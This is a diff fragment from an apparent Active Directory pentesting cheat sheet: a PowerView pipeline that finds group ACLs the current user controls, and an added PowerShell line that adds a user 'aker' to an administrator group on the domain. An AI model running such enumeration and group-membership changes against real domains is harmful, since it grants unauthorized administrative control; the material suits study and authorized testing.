@@ -735,7 +735,9 @@ Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member 
 $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
-
+```powershell
+net group Administrator aker /add /domain
+```
 
 ## Enhanced Security Bypass
 
